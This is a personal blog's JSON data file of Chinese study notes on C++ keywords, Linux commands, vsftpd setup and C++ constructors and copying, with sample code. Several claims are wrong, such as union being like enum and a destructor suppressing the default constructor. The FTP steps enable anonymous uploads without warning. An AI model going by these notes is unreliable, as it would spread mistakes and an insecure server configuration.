{"meta":{"title":"YanChen","subtitle":null,"description":"博客关注WEB网络安全、IT行业、网络资源、电脑技术、网络安全技术、网络安全知识、互联网安全知识、网站建设技术交流博、学习投资、金融理财","author":"John Doe","url":"https://xiaowuyoucy.github.io","root":"/"},"pages":[{"title":"","date":"2019-12-05T12:12:01.571Z","updated":"2019-03-15T13:29:05.675Z","comments":false,"path":"/404.html","permalink":"https://xiaowuyoucy.github.io//404.html","excerpt":"","text":"404 Not Found：该页无法显示-返回博客首页"},{"title":"关于 陈焱（Yan Chen）","date":"2020-11-17T15:32:01.437Z","updated":"2020-11-17T15:32:01.437Z","comments":false,"path":"about/index.html","permalink":"https://xiaowuyoucy.github.io/about/index.html","excerpt":"","text":"Content [One.陈焱的人生事件纪要] [Two.Resesume of YanChen] Three.Annual Summery of YanChen ​"},{"title":"分类","date":"2019-12-05T12:12:01.590Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"categories/index.html","permalink":"https://xiaowuyoucy.github.io/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-12-05T12:12:01.608Z","updated":"2019-04-14T19:39:56.059Z","comments":true,"path":"links/index.html","permalink":"https://xiaowuyoucy.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-12-05T12:12:01.877Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"tags/index.html","permalink":"https://xiaowuyoucy.github.io/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2019-12-05T12:12:01.613Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"repository/index.html","permalink":"https://xiaowuyoucy.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"cpp单词","slug":"bcck01cpp单词","date":"2021-04-28T13:58:43.000Z","updated":"2021-04-28T15:19:07.559Z","comments":true,"path":"2021/04/28/bcck01cpp单词/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/28/bcck01cpp单词/","excerpt":"","text":"day 1 asm auto bool break case catch ​ char class operator const const_cast continue default delete do double dynamic_cast ​ else enum explicit export extern false float for friend ​ goto if inline int long mutable ​ namespace new private protected ​ public register reinterpret_cast return short signed ​ sizeof static static_cast struct switch template this throw ​ true try typedef typeid typename union unsigned using virtual ​ void volatile ​ wchar_t 1. asm asm (指令字符串)：允许在 C++ 程序中嵌入汇编代码。 2. auto auto（自动，automatic）是存储类型标识符，表明变量&quot;自动&quot;具有本地范围，块范围的变量声明（如for循环体内的变量声明）默认为auto存储类型。 3. bool bool（布尔）类型，C++ 中的基本数据结构，其值可选为 true（真）或者 false（假）。C++ 中的 bool 类型可以和 int 混用，具体来说就是 0 代表 false，非 0 代表 true。bool 类型常用于条件判断和函数返回值。 4. break break（中断、跳出），用在switch语句或者循环语句中。程序遇到 break 后，即跳过该程序段，继续后面的语句执行。 5. case 用于 switch 语句中，用于判断不同的条件类型。 6. catch catch 和 try 语句一起用于异常处理。 7. char char（字符，character）类型，C++ 中的基本数据结构，其值一般为 0~255 的 int。这 256 个字符对应着 256 个 ASCII 码。char 类型的数据需要用单引号 ’ 括起来。 8.class class（类）是 C++ 面向对象设计的基础。使用 class 关键字声明一个类。 9. const const（常量的，constant）所修饰的对象或变量不能被改变，修饰函数时，该函数不能改变在该函数外面声明的变量也不能调用任何非const函数。在函数的声明与定义时都要加上const，放在函数参数列表的最后一个括号后。在 C++ 中，用 const 声明一个变量，意味着该变量就是一个带类型的常量，可以代替 #define，且比 #define 多一个类型信息，且它执行内链接，可放在头文件中声明；但在 C 中，其声明则必须放在源文件（即 .C 文件）中，在 C 中 const 声明一个变量，除了不能改变其值外，它仍是一具变量。如: 123const double pi(3.14159);或 const double pi = 3.14159; 10. const_cast用法： 1const_cast&lt;type_id&gt; (expression) 该运算符用来修改类型的 const 或 volatile 属性。除了 const 或 volatile 修饰之外， type_id 和 expression 的类型是一样的。常量指针被转化成非常量指针，并且仍然指向原来的对象；常量引用被转换成非常量引用，并且仍然指向原来的对象；常量对象被转换成非常量对象。 11. continue continue（继续）关键字用于循环结构。它使程序跳过代码段后部的部分，与 break 不同的是，continue 不是进入代码段后的部分执行，而是重新开始新的循环。因而它是&quot;继续循环&quot;之意，不是 break（跳出）。 12. default default（默认、缺省）用于 switch 语句。当 switch 所有的 case 都不满足时，将进入 default 执行。default 只能放在 switch 语句所有的 case 之后，并且是可选的。 13. delete delete（删除）释放程序动态申请的内存空间。delete 后面通常是一个指针或者数组 []，并且只能 delete 通过 new 关键字申请的指针，否则会发生段错误。 14. do do-while是一类循环结构。与while循环不同，do-while循环保证至少要进入循环体一次。 15. double double（双精度）类型，C++ 中的基本数据结构，以双精度形式存储一个浮点数。 16. dynamic_cast dynamic_cast（动态转换），允许在运行时刻进行类型转换，从而使程序能够在一个类层次结构安全地转换类型。dynamic_cast 提供了两种转换方式，把基类指针转换成派生类指针，或者把指向基类的左值转换成派生类的引用。 17. else else 紧跟在 if 后面，用于对 if 不成立的情况的选择。 18. enum enum（枚举）类型，给出一系列固定的值，只能在这里面进行选择一个。 19. explicit explicit（显式的）的作用是&quot;禁止单参数构造函数&quot;被用于自动型别转换，其中比较典型的例子就是容器类型。在这种类型的构造函数中你可以将初始长度作为参数传递给构造函数。 20. export 为了访问其他编译单元（如另一代码文件）中的变量或对象，对普通类型（包括基本数据类、结构和类），可以利用关键字 extern，来使用这些变量或对象时；但是对模板类型，则必须在定义这些模板类对象和模板函数时，使用标准 C++ 新增加的关键字 export（导出）。 21. extern extern（外部的）声明变量或函数为外部链接，即该变量或函数名在其它文件中可见。被其修饰的变量（外部变量）是静态分配空间的，即程序开始时分配，结束时释放。用其声明的变量或函数应该在别的文件或同一文件的其它地方定义（实现）。在文件内声明一个变量或函数默认为可被外部使用。在 C++ 中，还可用来指定使用另一语言进行链接，这时需要与特定的转换符一起使用。目前仅支持 C 转换标记，来支持 C 编译器链接。使用这种情况有两种形式： 123extern &quot;C&quot; 声明语句extern &quot;C&quot; &#123; 声明语句块 &#125; 22. false false（假的），C++ 的基本数据结构 bool 类型的值之一。等同于 int 的 0 值。 23. float float（浮点数），C++ 中的基本数据结构，精度小于 double。 24. for for 是 C++ 中的循环结构之一。 25. friend friend（友元）声明友元关系。友元可以访问与其有 friend 关系的类中的 private/protected 成员，通过友元直接访问类中的 private/protected 成员的主要目的是提高效率。友元包括友元函数和友元类。 26. goto goto（转到），用于无条件跳转到某一标号处开始执行。 27. if if（如果），C++ 中的条件语句之一，可以根据后面的 bool 类型的值选择进入一个分支执行。 28. inline inline（内联）函数的定义将在编译时在调用处展开。inline 函数一般由短小的语句组成，可以提高程序效率。 29. int int（整型，integer），C++ 中的基本数据结构，用于表示整数，精度小于 long。 30. long long（长整型，long integer），C++ 中的基本数据结构，用于表示长整数。 31. mutable mutable（易变的）是 C++ 中一个不常用的关键字。只能用于类的非静态和非常量数据成员。由于一个对象的状态由该对象的非静态数据成员决定，所以随着数据成员的改变，对像的状态也会随之发生变化。如果一个类的成员函数被声明为 const 类型，表示该函数不会改变对象的状态，也就是该函数不会修改类的非静态数据成员。但是有些时候需要在该类函数中对类的数据成员进行赋值，这个时候就需要用到 mutable 关键字。 32. namespace namespace（命名空间）用于在逻辑上组织类，是一种比类大的结构。 33. new new（新建）用于新建一个对象。new 运算符总是返回一个指针。由 new 创建 34. operator operator（操作符）用于操作符重载。这是 C++ 中的一种特殊的函数。 35. private private（私有的），C++ 中的访问控制符。被标明为 private 的字段只能在本类以及友元中访问。 36. protected protected（受保护的），C++ 中的访问控制符。被标明为 protected 的字段只能在本类以及其继承类和友元中访问。 37. public public（公有的），C++ 中的访问控制符。被标明为 public 的字段可以在任何类 38.register register（寄存器）声明的变量称着寄存器变量，在可能的情况下会直接存放在机器的寄存器中；但对 32 位编译器不起作用，当 global optimizations（全局优化）开的时候，它会做出选择是否放在自己的寄存器中；不过其它与 register 关键字有关的其它符号都对32位编译器有效。 39. reinterpret_cast 用法： 1reinpreter_cast&lt;type-id&gt; (expression) type-id 必须是一个指针、引用、算术类型、函数指针或者成员指针。它可以把一个指针转换成一个整数，也可以把一个整数转换成一个指针（先把一个指针转换成一个整数，在把该整数转换成原类型的指针，还可以得到原先的指针值）。 40. return return（返回）用于在函数中返回值。程序在执行到 return 语句后立即返回，return 后面的语句无法执行到。 41. short short（短整型，short integer），C++ 中的基本数据结构，用于表示整数，精度小于 int。 42. signed signed（有符号），表明该类型是有符号数，和 unsigned 相反。数字类型（整型和浮点型）都可以用 signed 修饰。但默认就是 signed，所以一般不会显式使用。 43. sizeof 由于 C++ 每种类型的大小都是由编译器自行决定的，为了增加可移植性，可以用 sizeof 运算符获得该数据类型占用的字节数。 44. static static（静态的）静态变量作用范围在一个文件内，程序开始时分配空间，结束时释放空间，默认初始化为 0，使用时可改变其值。静态变量或静态函数，只有本文件内的代码才可访问它，它的名字（变量名或函数名）在其它文件中不可见。因此也称为&quot;文件作用域&quot;。在 C++ 类的成员变量被声明为 static（称为静态成员变量），意味着它被该类的所有实例所共享，也就是说当某个类的实例修改了该静态成员变量，其修改值为该类的其它所有实例所见；而类的静态成员函数也只能访问静态成员（变量或函数）。类的静态成员变量必须在声明它的文件范围内进行初始化才能使用，private 类型的也不例外。 45. static_cast 用法： 1static_cast &lt; type-id &gt; ( expression ) 该运算符把 expression 转换为 type-id 类型，但没有运行时类型检查来保证转换的安全性。它主要有如下几种用法： ① 用于类层次结构中基类和子类之间指针或引用的转换。进行上行转换（把子类的指针或引用转换成基类表示）是安全的；进行下行转换（把基类指针或引用转换成子类表示）时，由于没有动态类型检查，所以是不安全的。 ② 用于基本数据类型之间的转换，如把 int 转换成 char，把 int 转换成 enum。这种转换的安全性也要开发人员来保证。 ③ 把空指针转换成目标类型的空指针。 ④ 把任何类型的表达式转换成void类? 注意 static_cast 不能转换掉 expression 的 const、volitale、或者 __unaligned 属性。 46. struct struct（结构）类型，类似于 class 关键字，与 C 语言兼容（class 关键字是不与 C 语言兼容的），可以实现面向对象程序设计。 47. switch switch（转换）类似于 if-else-if 语句，是一种多分枝语句。它提供了一种简洁的书写，并且能够生成效率更好的代码。但是，switch 后面的判断只能是int（char也可以，但char本质上也是一种int类型）。switch 语句最后的 default 分支是可选的。 48. template template（模板），C++ 中泛型机制的实现。 49. this this 返回调用者本身的指针。 50. throw throw（抛出）用于实现 C++ 的异常处理机制，可以通过 throw 关键字&quot;抛出&quot;一个异常。 51. true true（真的），C++ 的基本数据结构 bool 类型的值之一。等同于 int 的非 0 值。 52. try try（尝试）用于实现 C++ 的异常处理机制。可以在 try 中调用可能抛出异常的函数，然后在 try 后面的 catch 中捕获并进行处理。 53. typedef typedef（类型定义，type define），其格式为： 1typedef 类型 定义名; 类型说明定义了一个数据类型的新名字而不是定义一种新的数据类型。定义名表示这个类型的新名字。 54. typeid 指出指针或引用指向的对象的实际派生类型。 55. typename typename（类型名字）关键字告诉编译器把一个特殊的名字解释成一个类型。在下列情况下必须对一个 name 使用 typename 关键字： 1． 一个唯一的name（可以作为类型理解），它嵌套在另一个类型中的。 2． 依赖于一个模板参数，就是说：模板参数在某种程度上包含这个name。当模板参数使编译器在指认一个类型时产生了误解。 56. union union（联合），类似于 enum。不同的是 enum 实质上是 int 类型的，而 union 可以用于所有类型，并且其占用空间是随着实际类型大小变化的。 57. unsigned unsigned（无符号），表明该类型是无符号数，和 signed 相反。 58. using 表明使用 namespace。 59. virtual virtual（虚的），C++ 中用来实现多态机制。 60. void void（空的），可以作为函数返回值，表明不返回任何数据；可以作为参数，表明没有参数传入（C++中不是必须的）；可以作为指针使用。 61. volatile volatile（不稳定的）限定一个对象可被外部进程（操作系统、硬件或并发线程等）改变，声明时的语法如下： 1int volatile nVint; 这样的声明是不能达到最高效的，因为它们的值随时会改变，系统在需要时会经常读写这个对象的值。因此常用于像中断处理程序之类的异步进程进行内存单元访问。 62. wchar_t wchar_t 是宽字符类型，每个 wchar_t 类型占 2 个字节，16 位宽。汉字的表示就要用到 wchar_t。","categories":[{"name":"编程词汇","slug":"编程词汇","permalink":"https://xiaowuyoucy.github.io/categories/编程词汇/"}],"tags":[]},{"title":"linux1-3","slug":"002linux1-3","date":"2021-04-28T13:17:57.000Z","updated":"2021-04-28T13:54:38.465Z","comments":true,"path":"2021/04/28/002linux1-3/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/28/002linux1-3/","excerpt":"","text":"快捷键 目录 ls和tree的使用 文件目录和文件的创建 删除目录和文件 文件和目录的拷贝 查看文件内容 mv命令 文件的检索 od 查看二进制文件 软件的安装和卸载 U盘挂载和卸载 ftp服务器配置 vsftpd 终端：(虚拟终端) 所有输入输出设备总称 shell： 命令解析器 bash： bore again shell 命令解析器。 快捷键: 命令和路径补齐: tab 主键盘快捷键: ​ 1).历史命令切换: ​ 历史命令:history ​ 向上遍历: ctrl + p ​ 向下遍历: ctrl + n 2).光标移动: 向左: ctrl + b 向右: ctrl + f 移动到头部: ctrl + a 移动到尾部: ctrl + e 3).删除字符: 删除光标后边的字符: ctrl + d 删除光标前面的字符: ctrl + h 删除光标前面的所有内容: ctrl + u 目录 / 根目录 ls / /bin 常用的命令 cd /bin 进入bin目录 /boot 开机启动项文件 /dev 设备文件 /etc 配置文件 /home 主目录,存放用户 /lib 动态链接库(共享库) /lost-found 存放文件碎片 /media 挂载外设 U盘或光盘等等 /mnt 手动挂载外设到这个目录 /opt 第三方软件 /root 超级用户目录 /sbin 管理员使用的系统管理程序 /usr 用户软件资源目录(用户的软件或文件) /usr/bin 系统用户的应用程序 /usr/sbin 超级用户使用的管理程序和系统守护程序 /usr/src 内核源码默认的放置目录 ctrl + l 清屏,或clear 绝对路径 从/开始 相对路径 ./当前路径 …/上一级路径 cd - 两个相邻目录切换 cd ~ 切换到当前用户目录 cd 切换到用户目录 yxc19981c@yc:~$ yxc19981c 用户名 yc 主机名 ~ 用户目录 $普通用户 超级用户root 切换到超级用户 sudo su 或 su root - rw- r– r– 1 root root 1937 9月 2 2020 ucontext.h 文件类型 所有者 所属组 其他人 硬连接数 文件所有者 文件所属组 文件大小 日期 文件名 文件类型： 文件 “-” 目录 “d” 软连接 “l” --快捷方式 管道 “p” 套接字 “s” 字符设备 “c” 块设备 “b” 未知类型 ls和tree的使用: ls -a 显示所有文件 ls -l 详细显示 ls -al ls -h 人性化显示文件大小 tree 目录 pwd 查看当前位置 文件目录和文件的创建 mkdir 目录名 mkdir dri/dir/dir -p 递归创建目录 mkdir -p dir/dir/dir touch 文件名 touch 文件名1 文件名2 … 文件名n 删除目录和文件 ​ rmdir 空目录名 rm 目录名 -rf (f代表不提示) ​ rm 文件名 -f rm 目录名 -ri (i代表提示) ​ 文件和目录的拷贝 cp 源文件 目标文件名 cp h1 h2 将h1复制一份并命名为h2 如果h2存在将原来内容覆盖 cp 源目录 目的目录 -r 如果目的目录不存在就将源码目拷贝一份并命名为目的目录 如果目的目录存在,就将源目录拷贝一份,复制到目的目录里面 查看文件内容 gedit 文件名 cat 文件名 cat 文件1 文件2 … 文件n 拼接查看文件 cat 文件1 | more more 文件名 回车 一行 空格 一页 只能往后看 q 退出 ctrl + c 退出 less 文件名 回车 一行 空格 一页 可以往前后看 q 退出 ctrl + c 退出 ctrl + p 向前一行 ctrl + n 先后一行 head 文件名 显示文件前十行 head -5 文件名 显示文件前五行 tail 文件名 显示文件后十行 tail -5 文件名 显示文件后五行 mv命令 文件改名 mv 源文件 改名后的文件 移动 ​ mv 文件名 目录名 将文件移动到目录中 文件的检索 grep -r “文件内容” 路径 -r代表递归检索文件 grep -r “printf” / 从根目录开始递归查找文件包含&quot;printf&quot;内容的文件 文件和目录属性命令 wc 获取文本文件的信息 yxsdc19c@yscc:/usr/include$ wc time.h 309 1515 10360 time.h 309代表行数 1515代表单词个数 10360代表字节数 od 查看二进制文件 od -t 文件名 -t 指定数据的显示格式 -tc ASCII字符 -tx 十六进制数 -td 有符号十进制数 -tu 无符号十进制数 -to 八进制数 -tf 浮点数 软件的安装和卸载 在线安装 安装 sudo apt-get install 软件名 卸载 sudo apt-get remove 软件名 更新 sudo apt-get update 更新软件列表 软件列表存放的是软件名字和下载地址 清理所有软件安装包 sudo apt-get clean 实际清理的是: /var/cache/apt/archives目录下的.deb文件 deb包安装 安装 sudo dpkg -i xxx.deb 卸载 sudo dpkg -r xxx 源码安装 1.解压缩源代码包 2.进入到安装目录 3.检测文件是否缺失,创建Makefile,检测编译环境: ./configure 4.编译源码 生成库和可以执行程序:make 5.把库和可执行程序,安装到系统目录下: sudo make install 6.删除和卸载软件:sudo make distclean 7.上述安装步骤并不是绝对的,应该先查看附带的README文件 U盘挂载和卸载 卸载: umount 设备文件名 挂载: mount 设备文件名 挂载路径 将外设挂载到非mnt目录时,会临时覆盖原来内容,卸载之后会恢复 ftp服务器配置 vsftpd 作用:文件上传和下载 ftp服务器配置 配置文件在/etc/vsftpd.conf anonymous_enable=YES 允许匿名用户登录 write_enable=YES 实名登录用户拥有写的权限 local_umask=022 设置本地掩码为022 anon_upload_enable=YES 匿名用户拥有写的权限 anon_mkdir_write_enable=YES 匿名用户可以在ftp服务器上创建目录 重启ftp服务 ​ sudo service vsftpd restart 实名登录ftp ftp ip地址 输入用户 输入密码 退出 bye quit exit 文件上传和下载 上传 在什么目录登录的,文件默认从那里找 put 文件名 下载 get 文件名 不允许操作目录,可以打包处理 匿名登录服务器 用户名 anonymous 不允许匿名用户在任意目录直接切换 只能在一个指定的目录范围内工作 需要在ftp服务器上创建一个匿名用户的目录 --匿名用户的根目录 在配置文件添加 anon_root=/home/yxc19980620c/myFtp/ 匿名登录默认路径是在/srv/ftp 在配置文件/etc/passwd可以查看并修改 ftp:x:123:127:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"深拷贝和浅拷贝","slug":"cpp0023-深拷贝和浅拷贝","date":"2021-04-26T13:22:10.000Z","updated":"2021-04-26T16:12:56.587Z","comments":true,"path":"2021/04/26/cpp0023-深拷贝和浅拷贝/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0023-深拷贝和浅拷贝/","excerpt":"","text":"深拷贝和浅拷贝 字符串如果进行浅拷贝会出现以下问题: 假设有两个char类型指针a,b指向同一个内存空间 当a被释放时,b还未修改,再次使用b时就会出现段错误(Linux)或内存中断(windows) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include&lt;iostream&gt;using namespace std;class Teacher &#123;public: Teacher() &#123; m_id = 0; m_name = NULL; &#125; //有参构造函数,开辟一个空间给m_name Teacher(int id,const char * name) &#123; int len = strlen(name); m_name = (char *)malloc(len + 1); strcpy(m_name, name); m_id = id; &#125; //拷贝构造函数,开辟一个空间 Teacher(const Teacher &amp; another) &#123; cout &lt;&lt; \"Teacher(const Teacher &amp; another)..\" &lt;&lt; endl; int len = strlen(another.m_name); this-&gt;m_name = (char *)malloc(len + 1); strcpy(this-&gt;m_name, another.m_name); this-&gt;m_id = another.m_id; &#125; //打印id 和name和name的地址 void print() &#123; cout &lt;&lt; m_id &lt;&lt; endl; cout &lt;&lt; m_name &lt;&lt; endl; cout &lt;&lt; (int *)m_name &lt;&lt; endl; cout &lt;&lt; \"================================================\" &lt;&lt; endl; &#125; //释放从堆区开辟的内存 ~Teacher() &#123; if (m_name != NULL) &#123; cout &lt;&lt; m_name &lt;&lt; \" \"; free(m_name); m_name = NULL; cout &lt;&lt; \"free\" &lt;&lt; endl; cout &lt;&lt; \"================================================\" &lt;&lt;endl; &#125; &#125;private: int m_id; char * m_name;&#125;;void test1()&#123; Teacher tc1(123, \"xiaoh\"); Teacher tc2(tc1); tc1.print(); tc2.print();&#125;int main(int argc, char* argv[])&#123; test1(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类中默认函数的隐藏条件","slug":"cpp0022-类中默认函数的隐藏条件","date":"2021-04-26T13:22:10.000Z","updated":"2021-04-26T13:27:28.461Z","comments":true,"path":"2021/04/26/cpp0022-类中默认函数的隐藏条件/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0022-类中默认函数的隐藏条件/","excerpt":"","text":"类中默认函数的隐藏条件 编译器不提供默认无参构造函数的条件: 1.显示的提供一个有参或无参构造函数 2.显示的提供一个拷贝构造函数 编译器不提供默认拷贝构造函数的条件 1.显示的提供一个拷贝构造函数 编译器不提供析构函数的条件 1.显示的提供了一个析构函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class B&#123;public: /* 默认提供的函数 B() &#123; //默认的无惨构造函数 &#125; B(const B&amp; b) &#123; m_b = b.m_b; //默认的拷贝构造函数 p = b.p; &#125; ~B() &#123; //默认的析构函数 &#125; */ //如果显示的写了一个普通构造函数， 会隐藏默认的无惨构造函数 //如果显示的写了一个拷贝构造函数 ，会隐藏默认的无参构造函数和默认的拷贝构造函数 //如果显示的写了一个析构函数， 会隐藏默认的析构函数 B(const B&amp; b) &#123; &#125;private: int m_b; char *p;&#125;;class A&#123;public: /* 默认的构造函数 如果普通构造函数，提供了一个显示的构造， 那么这个无参的默认构造就会被隐藏。 不会把拷贝构造函数隐藏掉 A() &#123; &#125; */ A(int a) &#123; m_a = a; &#125; /* 默认的拷贝构造函数 A(const A &amp; a) &#123; m_a = a; &#125; */ //显示的提供一个拷贝构造的函数的时候，默认的拷贝构造函数就会被隐藏 A(const A &amp;a) &#123; cout &lt;&lt; \"显示提供的拷贝构造函数\" &lt;&lt; endl; m_a = a.m_a; &#125; /* 默认的析构函数 ~A() &#123; &#125; */ //只有提供一个显示的析构函数，才会将默认的析构覆盖点 ~A() &#123; cout &lt;&lt; \"A的析构函数 调用 \" &lt;&lt; endl; &#125;private: int m_a;&#125;;int main(void)&#123; A aObj(10); //当你不提供任何构造函数的时候， 系统会有一个默认的构造函数 A aObj2 = aObj; //调用了aObj2的拷贝构造函数 //A aObj2(aObj); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"拷贝构造函数","slug":"cpp0021-拷贝构造函数","date":"2021-04-26T12:41:44.000Z","updated":"2021-04-26T13:06:54.805Z","comments":true,"path":"2021/04/26/cpp0021-拷贝构造函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0021-拷贝构造函数/","excerpt":"","text":"拷贝构造函数 编译器会默认提供一个浅拷贝的构造函数 一旦手动提供了一个拷贝构造函数,编译器将不再提供默认的拷贝构造函数 1234567class 类名&#123; 类名(const 类名 &amp; another) &#123; 拷⻉贝构造体 &#125;&#125; 1234567class A&#123; A(const A &amp; another) &#123; &#125;&#125; test.h 12345678910111213141516171819#pragma onceclass test&#123;public: test(); test(int a,int b); test(int a); //拷贝构造函数 test(const test &amp; another); //赋值操作符函数 void operator=(const test &amp; another); ~test(); void print();private: int mA; int mB;&#125;; test.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include \"test.h\"#include&lt;iostream&gt;using namespace std;test::test()&#123; mA = 0; mB = 0;&#125;test::test(int a, int b)&#123; mA = a; mB = b;&#125;test::test(int a)&#123; mA = a; mB = 0;&#125;test::test(const test &amp; another)&#123; mA = another.mA; mB = another.mB; cout &lt;&lt; \"我是拷贝构造函数\" &lt;&lt; endl;&#125;void test::operator=(const test &amp; another)&#123; mA = another.mA; mB = another.mB; cout &lt;&lt; \"我是赋值操作符函数\" &lt;&lt; endl;&#125;test::~test()&#123; cout &lt;&lt; \"~test\" &lt;&lt; endl;&#125;void test::print()&#123; cout &lt;&lt; mA &lt;&lt; endl; cout &lt;&lt; mB &lt;&lt; endl; &#125; main.cpp 12345678910111213#include&lt;iostream&gt;#include\"test.h\"using namespace std;int main(int argc, char* argv[])&#123; test t1(100, 200); test t2(111); test t3(t2);//调用拷贝构造函数 test t4 = t3;//这里调用的是拷贝构造函数,因为是初始化 t4 = t2; //这里是调用赋值操作符函数,因为不是初始化 return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"默认的无参构造和析构函数","slug":"cpp0020-默认的无参构造和析构函数","date":"2021-04-26T12:32:36.000Z","updated":"2021-04-26T12:37:41.411Z","comments":true,"path":"2021/04/26/cpp0020-默认的无参构造和析构函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0020-默认的无参构造和析构函数/","excerpt":"","text":"默认的无参构造和析构函数 不写构造函数时,编译器会默认提供一个无参构造函数 如果显示的提供了一个构造函数,编译器将不再提供无参构造函数 如果显示提供了一个析构函数,编译器将不再提供构造函数 如果手动添加了一个有参构造函数,就需要根据情况添加一个无参构造函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Test&#123;public: //默认构造函数。 就是一个无参数的构造函数， //如果不显示提供构造函数，系统就是调用默认的构造函数 /* Test() &#123;&#125; 默认的构造函数，已经手动提供，默认就被隐藏 */ //如果我们提供了一个显示的构造函数，那么默认的构造函数就被隐藏掉了。 //构造函数一旦手动提供， 默认将不复存在。 Test(int x, int y) &#123; m_x = x; m_y = y; cout &lt;&lt; \"调用了有参数的构造函数\" &lt;&lt; endl; &#125; //无参数的构造函数 Test()&#123; m_x = 0; m_y = 0; cout &lt;&lt; \"调用了无参数的构造函数\" &lt;&lt; endl; &#125; //拷贝构造函数 ，想通过另一个Test对象 another 将本对象进行拷贝 Test(const Test &amp; another) &#123; m_x = another.m_x; m_y = another.m_y; cout &lt;&lt; \"调用了拷贝构造函数\" &lt;&lt; endl; &#125; //等号操作符 void operator = (const Test &amp;t) &#123; m_x = t.m_x; m_y = t.m_y; &#125; void printT() &#123; cout &lt;&lt; \"x : \" &lt;&lt; m_x &lt;&lt; \", y : \" &lt;&lt; m_y &lt;&lt; endl; &#125; //提供一个析构函数 ~Test() &#123; cout &lt;&lt; \"~Test（）析构函数被执行了\" &lt;&lt; endl; cout &lt;&lt; \"(\" &lt;&lt; m_x &lt;&lt; \", \" &lt;&lt; m_y &lt;&lt; \")\" &lt;&lt; \"被析构了\" &lt;&lt; endl; &#125; private: int m_x; int m_y;&#125;;int main(void)&#123; Test t1; //调用无参的构造函数 Test t2(10, 20); //Test t3(10, 20, 30); t2.printT(); Test t3(t2); //调用t3的拷贝构造函数 //调用拷贝构造函数的方式 t3.printT(); //Test t4 = t2; // 依然是调用t4的拷贝构造函数， Test t4(100, 200); //调用t4 的两个参数的构造函数 Test t5; //先调用无惨构造。 t5 = t2; //不会调用拷贝构造函数 //调用=号重载操作符 赋值操作符 //析构函数的调用顺序， 跟对象的构造顺序相反， 谁先构造，谁最后一个被析构。 return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"构造和析构","slug":"cpp0019-构造和析构","date":"2021-04-26T12:09:33.000Z","updated":"2021-04-26T12:26:06.742Z","comments":true,"path":"2021/04/26/cpp0019-构造和析构/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0019-构造和析构/","excerpt":"","text":"构造和析构 构造函数 定义 C++中的类可以定义与类名相同的特殊成员函数，这种与类名相同的成员函数叫做构造函数. 1234567class 类名&#123; 类名(形式参数) &#123; 构造体 &#125;&#125; 123456class A&#123; A(形参) &#123; &#125;&#125; 调用 自动调用：一般情况下C++编译器会自动调用构造函数. 手动调用：在一些情况下则需要手工调用构造函数. 规则: 1 在对象创建时自动调用,完成初始化相关工作。 2 无返回值,与类名同,默认无参,可以重载,可默认参数。 3 一经实现,默认不复存在。 析构函数 定义 C++中的类可以定义一个特殊的成员函数清理对象，这个特殊的成员函数叫做析构函数. 1234567891011121314151617class 类名&#123; ~类名() &#123; 析构体 &#125;&#125;//--------------------------------------------class A&#123; ~A() &#123; &#125;&#125; 规则: 1 对象销毁时,自动调用。完成销毁的善后工作。 2 无返值 ,与类名同。无参。不可以重载与默认参数 析构函数的作用,并不是删除对象,而在对象销毁前完成的一些清理工作。 test.h 12345678910111213#pragma onceclass test&#123;public: test(); test(int a,int b); test(int a); ~test(); void print();private: int mA; int mB;&#125;; test.cpp 12345678910111213141516171819202122232425262728293031323334#include \"test.h\"#include&lt;iostream&gt;using namespace std;test::test()&#123; mA = 0; mB = 0;&#125;test::test(int a, int b)&#123; mA = a; mB = b;&#125;test::test(int a)&#123; mA = a; mB = 0;&#125;test::~test()&#123; cout &lt;&lt; \"~test\" &lt;&lt; endl;&#125;void test::print()&#123; cout &lt;&lt; mA &lt;&lt; endl; cout &lt;&lt; mB &lt;&lt; endl; &#125; main.cpp 12345678910111213#include&lt;iostream&gt;#include\"test.h\"using namespace std;int main(int argc, char* argv[])&#123; test t1(100, 200); test t2(111); t1.print(); t2.print(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类分成多文件","slug":"cpp0018-类分成多文件","date":"2021-04-26T10:10:39.000Z","updated":"2021-04-26T10:32:21.713Z","comments":true,"path":"2021/04/26/cpp0018-类分成多文件/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0018-类分成多文件/","excerpt":"","text":"类分成多文件 circle.h 12345678910111213141516171819#pragma onceclass Circle&#123;public: void setR(double r); double getR(); double getArea(); double getGirth();private: double m_R; double m_area; double m_girth;&#125;; circle.cpp 在类的外部创建类方法需要使用作用域名; 函数类型 